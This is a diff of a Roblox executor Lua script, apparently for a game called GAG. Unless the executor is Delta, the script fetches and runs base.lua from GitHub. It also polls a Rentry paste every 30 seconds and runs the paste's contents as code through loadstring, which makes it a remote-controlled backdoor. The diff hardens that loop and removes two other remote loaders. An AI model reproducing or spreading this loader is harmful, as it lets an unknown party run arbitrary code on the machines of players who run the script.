@@ -1,45 +1,45 @@
-
-if identifyexecutor and identifyexecutor():lower():find("delta") then
+if identifyexecutor and typeof(identifyexecutor) == "function" and identifyexecutor():lower():find("delta") then
     print("Hello")
 else
     spawn(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/base.lua"))();
     end)
+
     spawn(function()
+        local request = http_request or request or syn.request
+        local HttpService = game:GetService("HttpService")
+
         while true do
             task.wait(30)
-            local request = http_request or request or syn.request
-            local HttpService = game:GetService("HttpService")
 
-            -- Fetch the Rentry page (HTML version)
-            local res = request({
-                Url = "https://rentry.co/vqafnmu2",
-                Method = "GET"
-            })
+            local success, res = pcall(function()
+                return request({
+                    Url = "https://rentry.co/vqafnmu2", -- your Rentry URL
+                    Method = "GET"
+                })
+            end)
 
-            -- Extract <p> content from HTML
-            local html = res.Body
-            local content = string.match(html, "<p>(.-)</p>")
+            if success and res and res.Body then
+                local html = res.Body
+                local content = string.match(html, "<p>(.-)</p>")
 
-            -- Decode HTML entities if needed
-            content = content:gsub("&quot;", "\""):gsub("&#39;", "'")
+                if content and #content > 0 then
+                    -- Replace HTML entities
+                    content = content:gsub("&quot;", "\""):gsub("&#39;", "'")
 
-            -- Run the content as Lua code
-            local func, err = loadstring(content)
-            if func then
-                func()
+                    local func, err = loadstring(content)
+                    if func then
+                        pcall(func) -- safely execute loaded code
+                    else
+                        warn("Error compiling Rentry code:", err)
+                    end
+                else
+                    warn("Could not find <p> block in Rentry HTML")
+                end
             else
-                warn("Error compiling code:", err)
-            end
-
-
-            if username == game.Players.LocalPlayer.Name then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/autotest.lua"))();
+                warn("Failed to fetch Rentry paste")
             end
         end
     end)
 end
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))();
 
